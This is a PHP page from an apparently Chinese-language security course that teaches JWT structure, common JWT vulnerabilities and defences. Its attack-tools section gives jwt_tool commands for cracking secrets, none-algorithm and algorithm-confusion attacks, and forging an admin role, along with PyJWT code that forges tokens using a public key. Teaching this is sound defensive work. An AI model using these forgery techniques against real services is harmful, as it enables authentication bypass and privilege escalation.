<?php
$module_name = 'JWT基础与原理';
$module_icon = '📚';
$module_desc = '讲解JSON Web Token(JWT)的基础知识和安全机制。';

$content = <<<'EOT'
<div class="card">
    <div class="card-header">
        <h5 class="mb-0">📚 JWT基础与原理</h5>
    </div>
    <div class="card-body">
        <div class="alert alert-info">
            <strong>💡 学习目标：</strong><br>
            了解JSON Web Token(JWT)的基础知识和安全机制，掌握其常见漏洞和防御方法。
        </div>

        <div class="card mb-3">
            <div class="card-header">
                <h6>📄 什么是JWT？</h6>
            </div>
            <div class="card-body">
                <p>JWT（JSON Web Token）是一种开放标准(RFC 7519)，用于在各方之间安全传输信息。JWT通常用于身份认证和信息交换。</p>

                <h5 class="mb-3 mt-4">JWT结构</h5>
                <p>JWT由三部分组成，用点号分隔：</p>
                <pre class="bg-dark text-light p-3 rounded"><code>Header.Payload.Signature

# 示例
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c</code></pre>

                <table class="table table-bordered mt-3">
                    <thead>
                        <tr>
                            <th>部分</th>
                            <th>说明</th>
                            <th>内容</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td>Header</td>
                            <td>令牌类型和签名算法</td>
                            <td><code>{"alg":"HS256","typ":"JWT"}</code></td>
                        </tr>
                        <tr>
                            <td>Payload</td>
                            <td>用户数据和声明</td>
                            <td><code>{"sub":"123","name":"John"}</code></td>
                        </tr>
                        <tr>
                            <td>Signature</td>
                            <td>签名验证</td>
                            <td>HMACSHA256签名值</td>
                        </tr>
                    </tbody>
                </table>
            </div>
        </div>

        <div class="card mb-3">
            <div class="card-header">
                <h6>🔄 JWT认证流程</h6>
            </div>
            <div class="card-body">
                <div class="bg-light p-3 rounded border mb-3">
                    <script src="../assets/js/mermaid.min.js"></script>
                    <div class="mermaid">
                        sequenceDiagram
                            participant User as 用户
                            participant Server as 服务器
                            
                            User->>Server: 1. 发送登录凭证
                            Server->>Server: 2. 验证凭证
                            Server-->>User: 3. 返回JWT令牌
                            User->>Server: 4. 请求携带JWT (Authorization: Bearer xxx)
                            Server->>Server: 5. 验证签名和有效期
                            Server-->>User: 6. 返回受保护资源
                    </div>
                </div>
            </div>
        </div>

        <div class="card mb-3">
            <div class="card-header">
                <h6>🎯 JWT常见漏洞</h6>
            </div>
            <div class="card-body">
                <ul>
                    <li><strong>算法混淆攻击：</strong>将RS256改为HS256，使用公钥作为密钥</li>
                    <li><strong>None算法攻击：</strong>将算法设置为none，绕过签名验证</li>
                    <li><strong>弱密钥：</strong>使用简单密钥可被暴力破解</li>
                    <li><strong>密钥泄露：</strong>密钥硬编码在代码或配置文件中</li>
                    <li><strong>信息泄露：</strong>Payload中包含敏感信息（未加密）</li>
                    <li><strong>令牌过期：</strong>未正确验证exp声明</li>
                </ul>
            </div>
        </div>

        <div class="card mb-3">
            <div class="card-header">
                <h6>🔧 JWT攻击工具</h6>
            </div>
            <div class="card-body">
                <p>以下是常用的JWT漏洞利用和测试工具：</p>
                
                <div class="accordion" id="jwtTools">
                    <div class="accordion-item">
                        <h2 class="accordion-header" id="tool1">
                            <button class="accordion-button" type="button" data-bs-toggle="collapse" data-bs-target="#collapseTool1" aria-expanded="true" aria-controls="collapseTool1">
                                1. jwt-tool (Python)
                            </button>
                        </h2>
                        <div id="collapseTool1" class="accordion-collapse collapse show" aria-labelledby="tool1" data-bs-parent="#jwtTools">
                            <div class="accordion-body">
                                <p><strong>jwt-tool</strong> 是一个功能强大的JWT安全测试工具，支持多种攻击模式。</p>
                                
                                <h6 class="mt-3">安装</h6>
                                <pre class="bg-dark text-light p-2 rounded"><code>pip install jwt-tool</code></pre>
                                
                                <h6 class="mt-3">常用命令</h6>
                                <div class="card bg-light p-3 rounded mb-2">
                                    <strong>1. 暴力破解密钥</strong>
                                    <pre class="bg-dark text-light p-2 rounded mt-2"><code>jwt_tool eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c -d /path/to/wordlist.txt</code></pre>
                                </div>
                                
                                <div class="card bg-light p-3 rounded mb-2">
                                    <strong>2. 算法混淆攻击</strong>
                                    <pre class="bg-dark text-light p-2 rounded mt-2"><code># 将RS256改为HS256，使用公钥签名
jwt_tool eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9... -X k -pk public.pem</code></pre>
                                </div>
                                
                                <div class="card bg-light p-3 rounded mb-2">
                                    <strong>3. None算法攻击</strong>
                                    <pre class="bg-dark text-light p-2 rounded mt-2"><code># 将算法改为none，删除签名
jwt_tool eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9... -X n</code></pre>
                                </div>
                                
                                <div class="card bg-light p-3 rounded">
                                    <strong>4. 伪造令牌</strong>
                                    <pre class="bg-dark text-light p-2 rounded mt-2"><code># 修改payload内容并重新签名
jwt_tool eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9... -I -pc "role=admin" -S secret</code></pre>
                                </div>
                            </div>
                        </div>
                    </div>
                    
                    <div class="accordion-item">
                        <h2 class="accordion-header" id="tool2">
                            <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapseTool2" aria-expanded="false" aria-controls="collapseTool2">
                                2. JWT.io (在线工具)
                            </button>
                        </h2>
                        <div id="collapseTool2" class="accordion-collapse collapse" aria-labelledby="tool2" data-bs-parent="#jwtTools">
                            <div class="accordion-body">
                                <p><strong>JWT.io</strong> 是一个在线JWT调试工具，可以方便地解码、编码和验证JWT。</p>
                                
                                <h6 class="mt-3">功能</h6>
                                <ul>
                                    <li>解码JWT：查看Header、Payload和Signature</li>
                                    <li>编码JWT：构造新的JWT令牌</li>
                                    <li>签名验证：使用密钥验证JWT签名</li>
                                    <li>实时调试：修改内容实时生成新令牌</li>
                                </ul>
                                
                                <h6 class="mt-3">使用场景</h6>
                                <ul>
                                    <li>快速查看JWT内容</li>
                                    <li>测试不同的payload修改</li>
                                    <li>验证签名算法</li>
                                </ul>
                                
                                <div class="alert alert-warning mt-3">
                                    <strong>⚠️ 注意：</strong>不要在生产环境中使用在线工具处理敏感JWT令牌，可能导致令牌泄露。
                                </div>
                            </div>
                        </div>
                    </div>
                    
                    <div class="accordion-item">
                        <h2 class="accordion-header" id="tool3">
                            <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapseTool3" aria-expanded="false" aria-controls="collapseTool3">
                                3. PyJWT (Python库)
                            </button>
                        </h2>
                        <div id="collapseTool3" class="accordion-collapse collapse" aria-labelledby="tool3" data-bs-parent="#jwtTools">
                            <div class="accordion-body">
                                <p><strong>PyJWT</strong> 是Python的JWT编码/解码库，可用于编写自定义攻击脚本。</p>
                                
                                <h6 class="mt-3">安装</h6>
                                <pre class="bg-dark text-light p-2 rounded"><code>pip install pyjwt</code></pre>
                                
                                <h6 class="mt-3">示例代码</h6>
                                <pre class="bg-dark text-light p-2 rounded"><code>import jwt

# 解码JWT
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
decoded = jwt.decode(token, options={"verify_signature": False})
print(decoded)

# 编码JWT
payload = {"user": "admin", "role": "admin"}
secret = "your-secret-key"
token = jwt.encode(payload, secret, algorithm="HS256")
print(token)

# 算法混淆攻击示例
public_key = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...
-----END PUBLIC KEY-----"""

payload = {"user": "admin", "role": "admin"}
# 使用公钥作为HMAC密钥
token = jwt.encode(payload, public_key, algorithm="HS256")
print(token)</code></pre>
                            </div>
                        </div>
                    </div>
                    
                    <div class="accordion-item">
                        <h2 class="accordion-header" id="tool4">
                            <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapseTool4" aria-expanded="false" aria-controls="collapseTool4">
                                4. Burp Suite JWT扩展
                            </button>
                        </h2>
                        <div id="collapseTool4" class="accordion-collapse collapse" aria-labelledby="tool4" data-bs-parent="#jwtTools">
                            <div class="accordion-body">
                                <p><strong>Burp Suite</strong> 有多个JWT相关的扩展，可以在代理中自动测试JWT漏洞。</p>
                                
                                <h6 class="mt-3">推荐扩展</h6>
                                <ul>
                                    <li><strong>JSON Web Token Attacker</strong>：自动检测和利用JWT漏洞</li>
                                    <li><strong>JWT Editor</strong>：方便地编辑和签名JWT</li>
                                    <li><strong>JWT4B</strong>：JWT安全测试工具</li>
                                </ul>
                                
                                <h6 class="mt-3">使用方法</h6>
                                <ol>
                                    <li>安装Burp Suite</li>
                                    <li>在BApp Store中安装JWT扩展</li>
                                    <li>配置浏览器代理到Burp</li>
                                    <li>访问目标应用，捕获JWT请求</li>
                                    <li>使用扩展自动测试漏洞</li>
                                </ol>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="card">
            <div class="card-header">
                <h6>🛡️ 安全建议</h6>
            </div>
            <div class="card-body">
                <ol>
                    <li><strong>使用强密钥：</strong>密钥长度至少256位</li>
                    <li><strong>验证算法：</strong>服务端必须验证alg头是否为预期算法</li>
                    <li><strong>设置过期时间：</strong>短期有效的令牌</li>
                    <li><strong>敏感信息加密：</strong>不要在Payload中存储敏感数据</li>
                    <li><strong>使用HTTPS：</strong>防止令牌被窃取</li>
                    <li><strong>令牌刷新机制：</strong>实现refresh token</li>
                </ol>
            </div>
        </div>
    </div>
</div>
EOT;

include '../template/module_template.php';
?>
